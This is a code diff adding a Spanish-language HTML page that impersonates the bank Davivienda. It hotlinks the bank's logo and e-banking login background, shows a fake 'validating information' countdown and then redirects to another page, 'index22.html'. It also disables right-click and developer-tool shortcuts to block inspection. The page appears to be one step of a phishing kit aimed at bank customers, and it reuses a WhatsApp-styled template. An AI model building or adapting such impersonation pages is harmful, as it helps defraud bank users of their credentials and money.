@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Davivienda</title>
+    <!-- Favicon de WhatsApp -->
+    <link rel="shortcut icon" type="image/png" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rFVoUqc_cgA.png">
+    <!-- Fuente similar a la de WhatsApp -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <!-- Iconos de Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        /* Paleta de colores inspirada en WhatsApp */
+        :root {
+            --wa-primary-green: #008069;
+            --wa-secondary-green: #25d366;
+            --wa-light-green: #dcf8c6;
+            --wa-background: #eae6df;
+            --wa-chat-background: #e5ddd5;
+            --wa-white: #ffffff;
+            --wa-light-gray: #f0f2f5;
+            --wa-text-primary: #3b4a54;
+            --wa-text-secondary: #667781;
+            --wa-error: #ff3860;
+            --wa-border-radius: 12px;
+            --wa-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            --wa-transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+.foster-negro {
+  position: fixed; /* Fijo en la parte inferior */
+  bottom: 0;       /* En la parte inferior de la ventana */
+  left: 0;         /* Desde la izquierda */
+  width: 100%;     /* Cubrir toda la línea de la página */
+  background-color: #000; /* Fondo negro */
+  color: #fff;            /* Texto blanco */
+  padding: 8px;           /* Espaciado interno */
+  text-align: center;     /* Centrar el texto */
+  z-index: 9999;          /* Asegurarse que quede por encima de otros elementos */
+  font-family: 'Segoe UI', Arial, sans-serif;
+}
+        body {
+            background: url('https://enlinea.davivienda.com.sv/ebanking/images/login/home/home-davivienda.jpg') no-repeat center center;
+            background-size: cover;
+            /* Solución para móviles: usamos min-height con unidades de vista estables y evitamos 'fixed' */
+            min-height: 100vh;
+            min-height: 100dvh; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            padding: 20px;
+        }
+
+        /* Contenedor principal */
+        .wa-container {
+    width: 100%;
+    max-width: 420px;
+    background: transparent; /* Changed from var(--wa-white) to transparent */
+    border-radius: var(--wa-border-radius);
+    box-shadow: var(--wa-shadow);
+    overflow: hidden;
+    position: relative;
+    animation: fadeIn 0.8s ease-out;
+}
+
+        /* Encabezado simplificado */
+        .wa-header {
+            padding: 25px 20px 15px;
+            text-align: center;
+            background: var(--wa-white);
+            color: var(--wa-text-primary);
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .wa-logo img {
+            width: 150px;
+            height: auto;
+            max-width: 100%;
+        }
+
+        .wa-subtitle {
+            font-size: 0.9rem;
+            font-weight: 400;
+            color: var(--wa-text-secondary);
+            max-width: 90%;
+            margin: 10px auto 0;
+            line-height: 1.4;
+        }
+
+        .wa-content {
+            padding: 20px 25px;
+            text-align: center;
+        }
+
+        .loading-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .progress-container {
+            width: 100%;
+            margin: 10px 0 5px 0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #ee1c28;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 8px;
+        }
+
+        .progress-bar-inner {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, var(--wa-secondary-green) 0%, var(--wa-primary-green) 100%);
+            border-radius: 3px;
+            animation: loading 60s linear forwards;
+        }
+
+        .counter-container {
+            font-size: 0.9rem;
+            color: var(--wa-text-secondary);
+            margin: 8px 0;
+        }
+
+        .counter {
+            display: inline-block;
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--wa-primary-green);
+        }
+
+        .error-message {
+            color: var(--wa-error);
+            font-size: 0.85rem;
+            margin-top: 12px;
+            display: none;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .error-message a {
+            color: var(--wa-primary-green);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .error-message a:hover {
+            text-decoration: underline;
+        }
+
+        @keyframes fadeIn { 
+            from { opacity: 0; transform: scale(0.95); } 
+            to { opacity: 1; transform: scale(1); } 
+        }
+
+        @keyframes loading {
+            0% { width: 0; }
+            100% { width: 100%; }
+        }
+
+        @media (max-width: 480px) {
+            .wa-container { max-width: 100%; }
+            .wa-content { padding: 15px 20px; }
+            .wa-header { padding: 20px 15px 10px; }
+            .wa-logo img { width: 120px; }
+            .wa-subtitle { font-size: 0.85rem; }
+        }
+
+
+
+               .top-strip {
+    background-color:#ee1c28 /* Color rojo */
+    height: 60px; /* Altura de la franja, ajusta según prefieras */
+    width: 100%;
+    display: flex;
+    align-items: center;
+    padding: 0 10px; /* Espacio interior */
+    box-shadow: 0 2px 4px rgba(0,0,0,0.2); /* Opcional, sombra */
+    position: fixed; /* Para que quede fija en la parte superior */
+    top: 0;
+    left: 0;
+    z-index: 9998; /* Para que quede por encima de otros elementos */
+}
+
+.top-strip {
+    background-color:#ee1c28;
+    height: 60px;
+    width: 100%;
+    display: flex;
+    align-items: center;
+    padding: 0 10px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: 9998;
+}
+
+
+.logo-container {
+    height: 100%;
+    display: flex;
+    align-items: center;
+}
+    </style>
+</head>
+<body oncontextmenu="return false">
+    <script>
+        document.addEventListener("keydown", function(e) {
+            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I") || (e.ctrlKey && e.key === "u")) {
+                e.preventDefault();
+                return false;
+            }
+        });
+    </script>
+
+
+    <div class="top-strip">
+    <div class="logo-container">
+        <img src="https://enlinea.davivienda.com.sv/ebanking/images/DAVIVIENDA/header/logo_davivienda.png" alt="Logo" class="logo">
+    </div>
+</div>
+
+    <div class="wa-container" role="alert" aria-live="polite">
+        <div class="wa-header">
+            <div class="wa-logo">
+                <img src="https://images.seeklogo.com/logo-png/62/2/davivienda-logo-png_seeklogo-623851.png" alt="Logo">
+            </div>
+            <p class="wa-subtitle">Validando Informacion...</p>
+        </div>
+        <div class="wa-content">
+            <div class="loading-content">
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-bar-inner"></div>
+                    </div>
+                    <div class="counter-container">
+                        Por favor espera <span class="counter" id="counter" aria-label="Contador regresivo: 60">60</span> segundos
+                    </div>
+                </div>
+
+                <div class="error-message" id="error-message">
+                    No se pudo redirigir automáticamente. 
+                    <a href="index22.html" aria-label="Continuar manualmente">Haz clic aquí para continuar.</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            let count = 30;
+            const counterElement = document.getElementById('counter');
+            const errorMessage = document.getElementById('error-message');
+
+            const countdown = setInterval(() => {
+                count--;
+                counterElement.textContent = count;
+                counterElement.setAttribute('aria-label', `Contador regresivo: ${count}`);
+                if (count === 0) {
+                    clearInterval(countdown);
+                    try {
+                        window.location.href = 'index22.html';
+                    } catch (e) {
+                        errorMessage.style.display = 'block';
+                    }
+                }
+            }, 1000);
+
+            $('.wa-container').hide().fadeIn(800);
+        });
+    </script>
+
+       <div class="foster-negro">
+  <p>Davivienda - © 2026 Davivienda - Todos los derechos reservados</p>
+</div>
+
+</body>
+</html>
